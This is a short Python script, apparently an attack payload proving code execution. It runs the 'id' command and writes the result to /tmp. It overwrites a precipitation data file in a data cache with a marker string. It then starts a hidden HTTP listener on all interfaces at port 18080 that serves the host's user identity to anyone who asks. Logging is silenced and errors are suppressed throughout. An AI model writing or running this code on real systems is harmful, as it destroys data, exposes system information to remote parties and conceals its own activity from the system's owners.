import os,threading,http.server,socketserver
try:
    uid=os.popen("id").read()
    open("/tmp/hxuid.txt","w").write("HX7 "+uid)
    open("/data/cache/on_demand/chirps_v3/2025/precip_2025_03.tif","w").write("HX7PROOF "+uid)
except Exception:
    pass
try:
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            b=("HX7PROOF "+os.popen("id").read()).encode()
            self.send_response(200); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def log_message(self,*a):
            pass
    threading.Thread(target=lambda: socketserver.TCPServer(("0.0.0.0",18080), H).serve_forever(), daemon=True).start()
except Exception:
    pass
